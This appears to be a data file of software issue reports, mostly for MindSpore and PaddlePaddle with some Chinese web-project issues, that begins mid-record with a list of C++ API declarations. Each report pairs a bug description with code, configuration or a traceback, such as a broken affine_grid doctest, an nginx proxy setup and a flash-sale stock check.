index, bool new_flag); +MS_INTERNAL_API void SetSequenceElementsUseFlags(const AbstractBasePtr &amp;abs, bool new_flag); +MS_INTERNAL_API void SetSequenceElementsUseFlagsRecursively(const AbstractBasePtr &amp;abs, bool new_flag); +MS_INTERNAL_API extern const TypePtr kIOMonadType; +MS_INTERNAL_API extern const TypePtr kUMonadType; +MS_INTERNAL_API TypeId NormalizeTypeId(const TypeId type_id); +MS_INTERNAL_API size_t GetTypeByte(const TypePtr &amp;type_ptr); +class MS_INTERNAL_API FuncGraph : public deprecated::api::FuncGraph, public FuncGraphBase, public EffectInfoHolder { +class MS_INTERNAL_API FuncGraphLoopBreaker { +class MS_INTERNAL_API Cloner { +MS_INTERNAL_API AnfNodePtr InlineClone(const FuncGraphPtr &amp;func_graph, const FuncGraphPtr &amp;target_func_graph, +MS_INTERNAL_API FuncGraphPtr LiftingClone(const FuncGraphPtr &amp;func_graph); +MS_INTERNAL_API ClonerPtr SpecializerClone(const FuncGraphPtr &amp;func_graph, const TraceInfoPtr &amp;relation); +MS_INTERNAL_API FuncGraphPtr TransformableClone(const FuncGraphPtr &amp;func_graph, +MS_INTERNAL_API FuncGraphPtr BasicClone(const FuncGraphPtr &amp;func_graph, bool clone_value_nodes = false, +class MS_INTERNAL_API FuncGraphTransform { +MS_INTERNAL_API std::vector&lt;AnfNodePtr&gt; SuccDeeperSimple(const AnfNodePtr &amp;node); +MS_INTERNAL_API std::vector&lt;AnfNodePtr&gt; SuccIncoming(const AnfNodePtr &amp;node); +MS_INTERNAL_API const std::vector&lt;AnfNodePtr&gt; &amp;GetInputs(const AnfNodePtr &amp;node); +MS_INTERNAL_API IncludeType IncludeBelongGraph(const FuncGraphPtr &amp;fg, const AnfNodePtr &amp;node); +MS_INTERNAL_API std::vector&lt;AnfNodePtr&gt; DeepScopedGraphSearch(const AnfNodePtr &amp;root, +MS_INTERNAL_API std::vector&lt;AnfNodePtr&gt; DeepLinkedGraphSearch(const AnfNodePtr &amp;root, +MS_INTERNAL_API std::vector&lt;AnfNodePtr&gt; DeepScopedGraphSearchWithFilter(const AnfNodePtr &amp;root, +MS_INTERNAL_API std::vector&lt;AnfNodePtr&gt; TopoSort(const AnfNodePtr &amp;root, const SuccFunc &amp;succ = SuccIncoming, +MS_INTERNAL_API std::vector&lt;CNodePtr&gt; BroadFirstSearchGraphCNodes(const CNodePtr &amp;start); +MS_INTERNAL_API CNodePtr BroadFirstSearchFirstOf(const std::vector&lt;CNodePtr&gt; &amp;starts, const MatchFunc &amp;match_predicate); +MS_INTERNAL_API FuncGraphManagerPtr Manage(FuncGraphPtr func_graph, bool manage = true); +MS_INTERNAL_API FuncGraphManagerPtr Manage(const std::vector&lt;FuncGraphPtr&gt; &amp;func_graphs, bool manage = true); +MS_INTERNAL_API FuncGraphManagerPtr MakeManager(const std::vector&lt;FuncGraphPtr&gt; &amp;func_graphs = {}, bool manage = true); +class MS_INTERNAL_API FuncGraphManager : public std::enable_shared_from_this&lt;FuncGraphManager&gt;, +class MS_INTERNAL_API FuncGraphTransaction { +class MS_INTERNAL_API MetaFuncGraph : public FuncGraphBase { +class MS_INTERNAL_API PrimalAttrManager { +class MS_INTERNAL_API PrimalDebugInfoManager { +MS_INTERNAL_API extern const ScopePtr kDefaultScope; +MS_INTERNAL_API extern const ValuePtr kUMonad; +MS_INTERNAL_API extern const ValuePtr kIOMonad; +class MS_INTERNAL_API AnfIrVisitor { +MS_INTERNAL_API bool InferMindir(const FuncGraphPtr &amp;root, const AbstractBasePtrList &amp;args, +class MS_INTERNAL_API MindIRLoader { +MS_INTERNAL_API FuncGraphPtr ConvertStreamToFuncGraph(const char *buf, const size_t buf_size, bool is_lite = false); +class MS_INTERNAL_API ActorBase { +class MS_INTERNAL_API AID { +class MS_INTERNAL_API RandInt { +class MS_INTERNAL_API ActorMgr { +class MS_INTERNAL_API ThreadPool { +class MS_INTERNAL_API AbstractScope { +class MS_INTERNAL_API AnfUtils { +class MS_INTERNAL_API Any { +class MS_INTERNAL_API CheckAndConvertUtils { +MS_INTERNAL_API std::unique_ptr&lt;Byte[]&gt; Encrypt(size_t *encrypt_len, const Byte *plain_data, size_t plain_len, +MS_INTERNAL_API std::unique_ptr&lt;Byte[]&gt; Decrypt(size_t *decrypt_len, const std::string &amp;encrypt_data_path, +MS_INTERNAL_API std::unique_ptr&lt;Byte[]&gt; Decrypt(size_t *decrypt_len, const Byte *model_data, size_t data_size, +MS_INTERNAL_API bool IsCipherFile(const std::string &amp;file_path); +MS_INTERNAL_API bool IsCipherFile(const Byte *model_data); +class MS_INTERNAL_API FileUtils { +class MS_INTERNAL_API GraphDebugInfo : public DebugInfo { +struct MS_INTERNAL_API DebugInfoCompare { +MS_INTERNAL_API void UpdateDebugInfo(const FuncGraphPtr &amp;func_graph, const ScopePtr &amp;scope, +class MS_INTERNAL_API InterpretNodeRecorder { +MS_INTERNAL_API TraceLabelType GetGlobalTraceLabelType(); +MS_INTERNAL_API std::string Label(const DebugInfoPtr &amp;debug_info, +MS_INTERNAL_API void InitSubModulesLogLevel(); +class MS_INTERNAL_API LogWriter { +MS_INTERNAL_API extern const int RET_SUCCESS; +MS_INTERNAL_API extern const int RET_FAILED; +MS_INTERNAL_API extern const int RET_CONTINUE; +MS_INTERNAL_API extern const int RET_BREAK; +class MS_INTERNAL_API MsContext { +class MS_INTERNAL_API MsException { +class MS_INTERNAL_API StaticAnalysisException { +MS_INTERNAL_API const char *SafeCStr(const std::string &amp;&amp;str); +MS_INTERNAL_API bool IsInParallelBlackList(const PrimitivePtr &amp;); +MS_INTERNAL_API bool IsInAllGatherNodeList(const CNodePtr &amp;); +MS_INTERNAL_API bool IsInTrivialNodeList(const CNodePtr &amp;); +MS_INTERNAL_API bool IsParallelConsiderCNode(const CNodePtr &amp;); +MS_INTERNAL_API double GetTime(); +class MS_INTERNAL_API ProfContext { +class MS_INTERNAL_API ProfileBase { +class MS_INTERNAL_API Profile : public ProfileBase { +class MS_INTERNAL_API ProfTransaction { +class MS_INTERNAL_API DumpTime { +class MS_INTERNAL_API MsProfile { +class MS_INTERNAL_API Crc32c { +class MS_INTERNAL_API PosixFileSystem : public FileSystem { +class MS_INTERNAL_API WinFileSystem : public FileSystem { +MS_INTERNAL_API std::string GetHashFromFile(const std::string &amp;path); +class MS_INTERNAL_API TensorConstructUtils { +MS_INTERNAL_API std::string GetDebugInfo(const DebugInfoPtr &amp;info, SourceLineTip tip = kSourceLineTipNextLine); +MS_INTERNAL_API std::string GetDebugInfo(const DebugInfoPtr &amp;info, const std::string &amp;prefix, +MS_INTERNAL_API std::string DumpSourceLines(const AnfNodePtr &amp;node); +MS_INTERNAL_API std::string DumpSourceLines(AnfNode *node); +MS_INTERNAL_API std::vector&lt;std::string&gt; GetSourceLineList(const AnfNodePtr &amp;node); +MS_CORE_API void common_log_init(void) { + static PrimalAttrManager &amp;GetInstance() noexcept; + static PrimalDebugInfoManager &amp;GetInstance() noexcept; + static ScopeManager &amp;GetInstance() noexcept; + static RandInt &amp;Instance(); + static InterpretNodeRecorder &amp;GetInstance(); + static MsException &amp;Instance(); + static StaticAnalysisException &amp;Instance(); + static DumpTime &amp;GetInstance();"
api接口 /api/products   报空指针,"/** * 商品列表 * @HTTP4O4 */ @加贝 @SuppressWarnings(""unchecked"") public List getGoodsList(YxStoreProductQueryParam productQueryParam) {   <code>: QueryWrapper&lt;YxStoreProduct&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.eq(""is_del"",0).eq(""is_show"",1).orderByDesc(""sort""); //销量排序 if(productQueryParam.getSalesOrder().equals(""desc"")){ wrapper.orderByDesc(""sales""); }else{ wrapper.orderByAsc(""sales""); } //价格排序 if(productQueryParam.getPriceOrder().equals(""desc"")){ wrapper.orderByDesc(""price""); }else{ wrapper.orderByAsc(""price""); }"
[ST][MS][NET][lenet-simqat][GPU 1p]Network training does not support loading of pretrained ckpt ,"请确认lenet-simqat网络是否支持加载预训练模型，如果不支持， 请删除readme的预训练样例 删除训练shell脚本的预训练流程代码 / 硬件环境: /device GPU : -- MindSpore version :r1.9 commit_id:4030fed4 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20220908 MindSpore 版本：编译时间20220914181553 r1.9.0 commit_id:4030fed4 (/): /mode graph test_ms_lenet_simqat_mnist_train_infer_gpu_1p_0001.py cd solution_test/cases/02network/00cv/Lenet_simqat/train pytest -s test_ms_lenet_simqat_mnist_train_infer_gpu_1p_0001.py 如果不支持预训练流程， 请删除readme的预训练样例 删除训练shell脚本的预训练流程代码 走个熊坤   <code>: usage: train.py [-h] [--config_path CONFIG_PATH] [--enable_modelarts ENABLE_MODELARTS] [--data_url DATA_URL] [--train_url TRAIN_URL] [--checkpoint_url CHECKPOINT_URL] [--data_path DATA_PATH] [--output_path OUTPUT_PATH] [--device_target {GPU}] [--enable_profiling ENABLE_PROFILING] [--checkpoint_file_path CHECKPOINT_FILE_PATH] [--num_classes NUM_CLASSES] [--lr LR] [--momentum MOMENTUM] [--epoch_size EPOCH_SIZE] [--batch_size BATCH_SIZE] [--buffer_size BUFFER_SIZE] [--image_height IMAGE_HEIGHT] [--image_width IMAGE_WIDTH] [--save_checkpoint_steps SAVE_CHECKPOINT_STEPS] [--keep_checkpoint_max KEEP_CHECKPOINT_MAX] [--device_id DEVICE_ID] [--file_name FILE_NAME] [--file_format {AIR,MINDIR}] [--fp32_ckpt FP32_CKPT] [--model_name MODEL_NAME] [--learning_rate LEARNING_RATE] [--dataset_name DATASET_NAME] [--sink_size SINK_SIZE] [--dataset_sink_mode DATASET_SINK_MODE] [--save_checkpoint SAVE_CHECKPOINT] [--save_checkpoint_epochs SAVE_CHECKPOINT_EPOCHS] [--mode_name MODE_NAME] [--result_path RESULT_PATH] [--img_path IMG_PATH] train.py: error: unrecognized arguments: --pre_trained=/home/workspace/mindspore_ckpt/lenet_quant/lenet/checkpoint_lenet-10_1875.ckpt {'data_url': 'Dataset url for obs', 'train_url': 'Training output url for obs', 'data_path': 'Dataset path for local', 'output_path': 'Training output path for local', 'device_target': 'Target device type', 'enable_profiling': 'Whether enable profiling while training, default: False', 'file_name': 'output file name.', 'file_format': 'file format', 'result_path': 'result files path.', 'img_path': 'image file path.'}"
点击侧边菜单时，主菜单不显示当前,"我的模式为：顶部是主菜单模块，左侧是子菜单模块。 源码中设置了顶部栏初始数为5，但是1当你自定义菜单增多时…… eg: 你有10个主菜单，你点击第六个模块、以及其子菜单时，你发现当前菜单未高亮显示，就是看不到当前主菜单是哪一个！ 修改建议： 源码里有动态设置顶部菜单栏 并且顶部显示都是根据 visibleNumber 值来判断， 考虑到执行顺序，建议把该函数放在created()函数中，即可解决！   <code>: visibleNumber: 5, mounted() { this.setVisibleNumber(); }"
[CT][MS]资料api affine_grid 里面样例代码执行报错,"mindspore/ops/function/array_func.py line 3178, import mindspore.ops as ops output = op.affine_grid(theta, out_size, False) NameError: name 'op' is not defined / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph   <code>: ### start mindspore.ops.function.array_func.affine_grid ### Trying: import mindspore Expecting nothing ok Trying: from mindspore import Tensor Expecting nothing ok Trying: import mindspore.ops as ops Expecting nothing ok Trying: theta = Tensor([[[0.8, 0.5, 0],[-0.5, 0.8, 0]]], mindspore.float32) Expecting nothing ok Trying: out_size = (1, 3, 2, 3) Expecting nothing ok Trying: output = op.affine_grid(theta, out_size, False) Expecting nothing ********************************************************************** File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/ops/function/array_func.py"", line 3178, in mindspore.ops.function.array_func.affine_grid Failed example: output = op.affine_grid(theta, out_size, False) Exception raised: Traceback (most recent call last): File ""/root/miniconda3/envs/ci3.7/lib/python3.7/doctest.py"", line 1329, in __run compileflags, 1), test.globs) File ""&lt;doctest mindspore.ops.function.array_func.affine_grid[5]&gt;"", line 1, in &lt;module&gt; output = op.affine_grid(theta, out_size, False) NameError: name 'op' is not defined"
py_func execute twice occurs an error,"环境: python 2.7 paddle 1.3 下面的代码连续执行两遍的时候就报错，测试py_func的功能 报错信息:   <code>: def py_func_binomial(input): """""" Binormial python function definition """""" input_array = np.array(input) print(input_array) input_len = input_array.shape sample = np.random.binomial(1, 0.5, size=input_len) ret = sample + input_array return ret def test_debug(): """""" If execute the function twice, it occurs an error """""" a = fluid.layers.data(name=""a"", shape=[1], dtype='float32') binomial_ret_var = create_tmp_var(name='binomial_result_var', dtype=a.dtype, shape=a.shape) hidden = fluid.layers.py_func(func=py_func_binomial, x=a, out=binomial_ret_var, backward_func=None, skip_vars_in_backward_input=None) x = np.zeros(10000) place = fluid.CPUPlace() exe = fluid.Executor(place) outs = exe.run( feed={'a':x}, fetch_list=[binomial_ret_var.name]) print(outs) print(np.sum(outs[0])) b = fluid.layers.data(name=""b"", shape=[1], dtype='float32') multinomial_ret_var = create_tmp_var(name='multinomial_ret_var', dtype=b.dtype, shape=b.shape) hidden2 = fluid.layers.py_func(func=py_func_binomial, x=b, out=multinomial_ret_var, backward_func=None, skip_vars_in_backward_input=None) x = np.zeros(10000) place1 = fluid.CPUPlace() exe1 = fluid.Executor(place1) outs1 = exe1.run( feed={'b':x}, fetch_list=[multinomial_ret_var.name]) print(outs1) print(np.sum(outs1[0])) Traceback (most recent call last): File ""test_py_func.py"", line 98, in &lt;module&gt; test_debug() #Wrong File ""test_py_func.py"", line 57, in test_debug fetch_list=[binomial_ret_var.name]) File ""/usr/local/lib/python2.7/dist-packages/paddle/fluid/executor.py"", line 525, in run use_program_cache=use_program_cache) File ""/usr/local/lib/python2.7/dist-packages/paddle/fluid/executor.py"", line 591, in _run exe.run(program.desc, scope, 0, True, True) File ""/usr/local/lib/python2.7/dist-packages/paddle/fluid/layers/nn.py"", line 9970, in __call__ func_ret = self._func(*args[idx:], **kwargs) File ""test_py_func.py"", line 31, in py_func_multinomial ret = sample + input_array TypeError: unsupported operand type(s) for +: 'int' and 'NoneType'"
support list add list in net in GraphMode.,"Task Use this template for task tracking kind/task Task Description support list add list in net in GraphMode. Task Goal Could use list add list in net in GraphMode, and the result is consistent with the execution result of the Python interpreter. Such as, Sub Task No. Task Description Issue ID 1 2   <code>: class Net(nn.Cell): def __init__(self): super(Net, self).__init__() self.value1 = [Tensor([1, 2, 3]), Tensor([4, 5, 6])] self.value2 = [Tensor([7, 8, 9]), Tensor([10, 11, 12])] def construct(self): return self.value1 + slef.value2 context.set_context(mode=context.GRAPH_MODE) net = Net() assert net() == (Tensor([1, 2, 3]), Tensor([4, 5, 6]), Tensor([7, 8, 9]), Tensor([10, 11, 12]))"
前后端不分离版本，nginx代理配置运行，一登录进去打开以前登录记住的菜单，不报错，然后随便点其它一个菜单或按钮就报：重新登录！,"nginx配置：   <code>: user www www; worker_processes auto; error_log /www/wwwlogs/nginx_error.log crit; pid /www/server/nginx/logs/nginx.pid; worker_rlimit_nofile 51200; events { use epoll; worker_connections 51200; multi_accept on; } http { include mime.types; #include luawaf.conf; include proxy.conf; default_type application/octet-stream; server_names_hash_bucket_size 512; client_header_buffer_size 32k; large_client_header_buffers 4 32k; client_max_body_size 50m; sendfile on; tcp_nopush on; keepalive_timeout 60; tcp_nodelay on; fastcgi_connect_timeout 300; fastcgi_send_timeout 300; fastcgi_read_timeout 300; fastcgi_buffer_size 64k; fastcgi_buffers 4 64k; fastcgi_busy_buffers_size 128k; fastcgi_temp_file_write_size 256k; fastcgi_intercept_errors on; gzip on; gzip_min_length 1k; gzip_buffers 4 16k; gzip_http_version 1.1; gzip_comp_level 2; gzip_types text/plain application/javascript application/x-javascript text/javascript text/css application/xml; gzip_vary on; gzip_proxied expired no-cache no-store private auth; gzip_disable ""MSIE [1-6]\.""; limit_conn_zone $binary_remote_addr zone=perip:10m; limit_conn_zone $server_name zone=perserver:10m; server_tokens off; access_log off; server { listen 80; server_name XXXX.cc; index index.html index.htm index.php; # root /www/server/phpmyadmin; #error_page 404 /404.html; #include enable-php.conf; # 这个是swagger接口的前缀 location /api { if ($request_method = OPTIONS) { add_header Access-Control-Allow-Origin $http_origin; # 必须要有 add_header Access-Control-Allow-Headers *; # 必须要有 #add_header Access-Control-Allow-Methods GET,POST,OPTIONS; # 不加也行 #add_header Access-Control-Allow-Credentials true; # 不加也行 return 200; # 204也可以，只要返回成功码即可 } proxy_pass http://localhost:9081/p/; } # 这个也是是swagger接口的前缀 location /napi { if ($request_method = OPTIONS) { add_header Access-Control-Allow-Origin $http_origin; # 必须要有 add_header Access-Control-Allow-Headers *; # 必须要有 #add_header Access-Control-Allow-Methods GET,POST,OPTIONS; # 不加也行 #add_header Access-Control-Allow-Credentials true; # 不加也行 return 200; # 204也可以，只要返回成功码即可 } proxy_pass http://localhost:9081/p/; } # 这个是图片访问，App先到要访问的 location /profile { if ($request_method = OPTIONS) { add_header Access-Control-Allow-Origin $http_origin; # 必须要有 add_header Access-Control-Allow-Headers *; # 必须要有 #add_header Access-Control-Allow-Methods GET,POST,OPTIONS; # 不加也行 #add_header Access-Control-Allow-Credentials true; # 不加也行 return 200; # 204也可以，只要返回成功码即可 } proxy_pass http://localhost:9081/p/; } # 这个是我的项目，即若依项目为基础的项目 location ^~/p/ { if ($request_method = OPTIONS) { add_header Access-Control-Allow-Origin $http_origin; # 必须要有 add_header Access-Control-Allow-Headers *; # 必须要有 #add_header Access-Control-Allow-Methods GET,POST,OPTIONS; # 不加也行 #add_header Access-Control-Allow-Credentials true; # 不加也行 return 200; # 204也可以，只要返回成功码即可 } proxy_pass http://localhost:9081/p/; } # 这个是我的前端，uniapp location / { root /pjava/h5; index index.html; } # 这个是我的前端，做过保险配置，我把前端放到了：/pjava/h5下 location /h5 { root /pjava; index index.html; } location ^~ /MP_verify_4AOfarDPKZi8aPG9.txt { root /pjava/; rewrite ^//(.*)$ \$1 break; } # location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ # { # expires 30d; #} # location ~ .*\.(js|css)?$ # { # expires 12h; #} # location ~ /\. #{ # deny all; #} access_log /www/wwwlogs/access.log; } include /www/server/panel/vhost/nginx/*.conf; }"
数据库pg动态序列名怎么实现 ,"使用pg数据库，由于表会重建，字段一样的，序列名称不一样， 主键注解如下： 现在需要动态修改fbc_pool_ pool_ id_ seq 为fbc_pool_2_ pool_ id_ seq，试过修改注解无效，元数据貌似在启动的时候在entityhelper缓存了，请作者不吝赐教。   <code>: @ld @Column(name = ""pool_id"") @GeneratedValue(strategy= GenerationType.IDENTITY,generator= ""SELECT nextval('fbc_pool_ pool_ id_ seq')"") private Long poolld;"
请问多mysql数据源如何指定 事务管理器的名称,"JDK版本: 1.8 SpringBoot版本:2.0.3 Starter版本: 2.4.2 这边使用分布式事务时需要指定事务的名称，请问使用该Starter如何指定各数据源事务的名称， 如 我需要指定名称为demoTransactionManager。谢谢 期望值: 实际值: 重现步骤 步骤1 步骤2 步骤3   <code>: @Transactional(value = ""demoTransactionManager"", rollbackFor = Exception.class)"
dataset: something wrong causes change storage UT Into tfreader op ut failed,"RFC here we want, modify all the c++ ut that use StorageOp into TFReaderOp ut here are 5 ut failed, like test_map_op_test.cc, it raise error like here might exist some problem in DataSchema or ColDescriptor or TFReaderOp, as tensor create for TFReaderOp is not correct and releted pr that currently failed is : !2143:dataset: remove storage_op c++ part   <code>: map_op_test.cc:365 Failure Expected tensor_list[i]-&gt;shape() which is &lt;24&gt; To be equal to golden_shapes[i] which is &lt;3, 4, 2&gt;"
SysFork函数调用OsClone不合理,"阅读代码 阅读代码 syscall函数SysFork会调用OsClone进行子进程的数据拷贝动作，OsClone第一个参数为flags，含义为拷贝标志位。 SysFork调用实参如下： 传入的CLONE_SIGHAND为0x00000800 OsClone的处理如下： 在此函数中，会校验flags和cloneFlag是否有交集，cloneFlag取值为0x0001c100，事实上因为传入的是CLONE_SIGHAND，本身确实跟cloneFlag没有交集，所以OsCopyProcess函数的第一个参数实参为0。 在这个过程中，SysFork调用时传入的CLONE_SIGHAND毫无意义，甚至可以直接传个0进去。 OsClone函数只有这一个被调用的场合，即SysFork调用，因此，不知为什么调用者和被调用者没有协调好。   <code>: int SysFork(void) { return OsClone(CLONE_SIGHAND, 0, 0); } LITE_OS_SEC_TEXT INT32 OsClone(UINT32 flags, UINTPTR sp, UINT32 size) { UINT32 cloneFlag = CLONE_PARENT | CLONE_THREAD | CLONE_VFORK | CLONE_VM; if (flags &amp; (~cloneFlag)) { PRINT_WARN(""Clone dont support some flags!\n""); } return OsCopyProcess(cloneFlag &amp; flags, NULL, sp, size); }"
ops.Mod算子在Ascend310和Ascend910上运算结果不一致,: /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 910中ops.Mod算子输入和输出：   <code>: /device &lt;device&gt;
knife4j-spring-boot-starter 3.0.2版本 MultipartFile类型参数UI调试界面显示不显示文件的“上传”按钮,"问题如图： 后台代码： 生成的api-doc如下： 复制到 https://editor.swagger.io/#/ 调试是没有问题的。   <code>: @Operation(summary = ""uploads an image"", security = { @SecurityRequirement(name = ""petstore_auth"", scopes = { ""write:pets"", ""read:pets""})}, tags = {""pet""}) @ApiResponses(value = { @ApiResponse(responseCode = ""200"", description = ""successful operation"", content = @Content(schema = @Schema(implementation = ModelApiResponse.class)))}) @PostMapping(value = ""/pet/{petId}/uploadImage"", produces = {""application/json""}, consumes = { ""application/octet-stream""}) public ResponseEntity&lt;ModelApiResponse&gt; uploadFile( @Parameter(description = ""ID of pet to update"", required = true) @PathVariable(""petId"") Long petId, @Parameter(description = ""Additional Metadata"") @RequestParam(value = ""additionalMetadata"", required = false) String additionalMetadata, @io.swagger.v3.oas.annotations.parameters.RequestBody( content = @Content(mediaType = ""application/octet-stream"", schema = @Schema( type = ""string"", format = ""binary""))) @Valid @RequestPart( ""file"") MultipartFile file) { return getDelegate().uploadFile(petId, additionalMetadata, file); } { ""openapi"": ""3.0.3"", ""info"": { ""title"": ""test"", ""description"": ""&lt;div style='font-size:14px;color:red;'&gt;test&lt;/div&gt;"", ""termsOfService"": ""http://www.test.cn"", ""contact"": { ""name"": ""test"", ""url"": ""www.test.cn"" }, ""version"": ""1.0"" }, ""servers"": [], ""paths"": { ""/oss/v1/upload"": { ""post"": { ""tags"": [ ""oss-storage-controller"" ], ""summary"": ""文件上传"", ""operationId"": ""uploadUsingPOST"", ""parameters"": [ { ""name"": ""title"", ""in"": ""query"", ""description"": ""title"", ""required"": false, ""style"": ""form"", ""schema"": { ""type"": ""string"" } } ], ""requestBody"": { ""content"": { ""multipart/form-data"": { ""schema"": { ""required"": [ ""file"" ], ""type"": ""object"", ""properties"": { ""file"": { ""type"": ""string"", ""description"": ""file"", ""format"": ""binary"", ""name"": ""file"", ""in"": ""query"" } } } } } }, ""responses"": { ""200"": { ""description"": ""OK"", ""content"": { ""*/*"": { ""schema"": { ""$ref"": ""#/components/schemas/RestResult"" } } } }, ""201"": { ""description"": ""Created"" }, ""401"": { ""description"": ""Unauthorized"" }, ""403"": { ""description"": ""Forbidden"" }, ""404"": { ""description"": ""Not Found"" } } } } }, ""components"": {} }"
Port WarpCTC Operator,"Fix #4923:add optional in op proto failed, so I disable it temporarily and will fix it next PR.   <code>: check_grad"
Refine concat_op,"fix : https://github.com/PaddlePaddle/Paddle/issues/8567 Analysis the operation The input is a list of tensors and which indicates the concation axis. The shape of input's tensor can be any, but only the dimension of can be different. For example, the input is two tensors. case 1: t_a's shape: [9,2,3,4] t_b's shape:[3,2,3,4] , Obviously, the output's shape is [12,2,3,4]. To simply solve this case, we can reshape t_a to [9, 24] and t_b to [3, 24], finally concate the two tensor longitudinally. The output's shape is [12, 24]. In this case, we only copy two times. case 2: t_a's shape: [9,2,3,4] t_b's shape:[9,3,3,4] , To simply solve this case, we can reshape t_a to [9, 2, 12] and t_b to [9, 3, 12], finally concate the two tensor on the second axis. The output's shape is [9,5,12]. In this case, we should copy 18 times. case 3: t_a's shape: [9,2,3,4] t_b's shape:[9,2,3,3] , Firstly, we reshape t_a to [54, 4] and t_b to [54, 3], finally concate the two tensor horizontally. The output's shape is [54, 7]. This is the worst case, we should copy 108 times. TODO use one Cuda kernel to complete those copies. All of those cases can be solved by one strategy.   <code>: concat axis axis axis = 0 axis = 1 axis = 3"
文档中使用WITH_TEST的地方，应该为WITH_TESTING,"有两处文档使用WITH_TEST的地方，应该为WITH_TESTING： http://www.paddlepaddle.org/docs/develop/documentation/zh/howto/dev/contribute_to_paddle_cn.html#构建和测试 https://github.com/PaddlePaddle/Paddle/blob/develop/paddle/scripts/docker/README.md#reading-source-code-with-woboq-codebrowser   <code>: docker run -v $(pwd):/paddle -e ""WITH_GPU=OFF"" -e ""WITH_AVX=ON"" -e ""WITH_TEST=ON"" paddle:dev docker run -v $PWD:/paddle -v $HOME/woboq_out:/woboq_out -e ""WITH_GPU=OFF"" -e ""WITH_AVX=ON"" -e ""WITH_TEST=ON"" -e ""WOBOQ=ON"" paddlepaddle/paddle:latest-dev"
train_from_dataset 如何获取tensor？,"这样我只能获得打印值，如何获得返回的tensor？ 比如类似fetch_targets   <code>: exe.train_from_dataset( program=main_program, dataset=dataset, fetch_list=[loss], fetch_info=[""[***Train Loss***]: ""], print_period=1, debug=False)"
重复 build 的问题,我在测试调试内核的流程，内核源码我已经 make build 过，然后开始执行如下命令 详细的 log 见下面（我突然发现gitee不支持上传附件 :(）   <code>: $ make feature f=debug $ make olddefconfig kernel $ make kernel // 这一步我执行了一会就 ctrl-c 了，换成下面的这步 $ make build kernel $ make debug linux // 看log貌似又build了一遍和上面重复的操作
乐观锁条件问题,"com.itstyle.seckill.service.impl.SeckillServiceImpl#startSeckilDBOCC 这里剩余的数量应该要大于秒杀的数量才行吧？ 详见第一个 if   <code>: public Result startSeckilDBOCC(long seckillId, long userId, long number) { Seckill kill = seckillRepository.findOne(seckillId); // 这里剩余的数量应该要大于秒杀的数量才行吧？ // if(kill.getNumber()&gt;0){ if(kill.getNumber()&gt;=number){ //乐观锁 String nativeSql = ""UPDATE seckill SET number=number-?,version=version+1 WHERE seckill_id=? AND version = ?""; int count = dynamicQuery.nativeExecuteUpdate(nativeSql, new Object[]{number,seckillId,kill.getVersion()}); if(count&gt;0){ saveSuccessKilled(seckillId, userId); return Result.ok(SeckillStatEnum.SUCCESS); }else{ return Result.error(SeckillStatEnum.END); } }else{ return Result.error(SeckillStatEnum.END); }"
权限认证问题,系统调试过程中经常会出现错误 目测问题应该发生在GetUser接口下面的逻辑中：   <code>: if (user != null) { result.Result = _app.GetAccessedControls(user.Account); }
[MS/modelzoo][ST][NET][GNMTV2][GPU] train fail,"训练失败 问题commitid：99d3df17 ok_commit_id:ac72a96d(20220614) / 硬件环境: /device GPU/ : -- MindSpore version :master commit_id:99d3df17 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_gnmtv2_gpu_check_loss_8p get code from models sh run_train.sh 训练成功 备注 提给高勇   <code>: Traceback (most recent call last): File ""train.py"", line 375, in &lt;module&gt; run_train() File ""/home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/gnmtv2/train/test_ms_gnmtv2_gpu_check_fps_1p_0001/scripts/train/model_utils/moxing_adapter.py"", line 105, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 372, in run_train train_single(_config) File ""train.py"", line 302, in train_single test_dataset=test_dataset) File ""train.py"", line 229, in _build_training_pipeline callbacks=callbacks) File ""train.py"", line 68, in _train callbacks=callbacks, dataset_sink_mode=config.dataset_sink_mode, sink_size=200) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 1050, in train initial_epoch=initial_epoch) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 98, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 624, in _train cb_params, sink_size, initial_epoch, valid_infos) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 702, in _train_dataset_sink_process outputs = train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 573, in __call__ out = self.compile_and_run(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 960, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 932, in compile jit_config_dict=self._jit_config_dict) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1103, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) RuntimeError: Output_idx0 of node kernel_graph_3:[CNode]124{[0]: ValueNode&lt;Primitive&gt; Reshape, [1]: [CNode]125} output addr is not exist. The function call stack: Corresponding code candidate: - In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/function/array_func.py(859)/ return reshape_(input_x, input_shape)/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_extends/parse/standard_method.py(2077)/ return F.reshape(x, shape)/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/layer/rnns.py(307)/ w_ih.view(-1, 1, 1),/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/layer/rnns.py(528)/ output, h_t = self.rnn(pre_layer, h_i, seq_length, w_ih, w_hh, b_ih, b_hh)/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/layer/rnns.py(573)/ x_n, hx_n = self._stacked_dynamic_rnn(x, hx, seq_length)/ In file 